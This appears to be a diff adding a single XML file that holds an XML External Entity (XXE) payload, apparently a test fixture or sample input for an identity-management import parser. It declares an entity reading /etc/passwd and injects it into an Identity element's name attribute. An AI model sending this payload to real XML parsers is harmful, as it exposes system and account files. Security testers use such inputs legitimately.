@@ -1,0 +1,1 @@
+<!DOCTYPE sailpoint [<!ENTITY secret SYSTEM "file:///etc/passwd">]><sailpoint><Identity id="i" name="&secret;"/></sailpoint>
